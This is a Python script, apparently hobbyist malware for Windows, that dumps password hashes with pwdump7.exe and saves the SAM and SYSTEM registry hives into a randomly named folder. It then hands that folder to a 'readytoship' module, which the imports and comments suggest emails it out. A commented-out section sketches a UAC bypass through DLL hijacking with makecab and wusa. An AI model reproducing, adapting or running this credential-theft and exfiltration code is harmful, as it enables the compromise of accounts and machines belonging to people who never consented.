import smtplib, zipfile, tempfile, os, platform
import random, requests, io, readytoship
from shutil import copyfile

''' Didn't know if this will actually works.
http://null-byte.wonderhowto.com/how-to/bypass-uac-using-dll-hijacking-0168600/

def DLL_Hijacking():
    if(platform.release() == 7):
        os.system('makecab cryptbase.dll cryptbase.tmp')
        os.system('wusa <input file> /extract:C:\\Windows\\ehome\\')
    elif(platform.release() == 8):
        os.system('makecab cryptbase.dll cryptbase.tmp')
        os.system('wusa <input file> /extract:C:\\Windows\\ehome\\')
    elif(platform.release() == 8.1):
        os.system('makecab cryptbase.dll cryptbase.tmp')
        os.system('wusa <input file> /extract:C:\\Windows\\ehome\\')
    else:
        break;
'''
# Throw out random folder name
tempname = 'C:\\Kongfu%d' % random.randint(168, 1337)
def get_sam():
    # Get this bitch SAM and System.
    #SAM = '\"\"reg save hklm\\SAM\ C:\\W1ndows\\SAM"\"'
    #SYSTEM = '\"\"reg save hklm\\System C:\\W1ndows\\System"\"'
    #MKDIR = '\"\"mkdir C:\\W1ndows"\"'
    #os.system(MKDIR)
    #os.system(SAM)
    #os.system(SYSTEM)
    # Above is Trash. probly.
    # Call out folder name
    #tempname = generate()

    os.system('mkdir %s' % tempname)

    os.system('.\\pwdump7.exe > %s\\kongfu.txt' % tempname)
    print(tempname)
    #print("mkdir done.")
    os.system('reg save hklm\\SAM %s\\SAM' % tempname)
    #print("Copy SAM done.")
    os.system('reg save hklm\\System %s\\System' % tempname)
    #print("Copy System done.")
    return True

''' Abandoned
def zip_it(sFilePath, dest = ""):
    if (dest == ""):
        zf = zipfile.ZipFile(sFilePath + '.ZIP', mode='w')
    else:
        zf = zipfile.ZipFile(dest, mode='w')
 
    os.chdir(sFilePath)
    #print sFilePath
    for root, folders, files in os.walk(".\\"):
        for sfile in files:
            aFile = os.path.join(root, sfile)
            #print aFile
            zf.write(aFile)
    zf.close()
 
# Hope that Worked.
#if __name__ == "__main__":
#    zip_it(r"C:\W1ndows", r"C:\W1ndows\hello.zip")
'''

get_sam()
#print('Zip file done.')

#print('Ready to ship.')
# Ready to Email
readytoship.main(tempname)
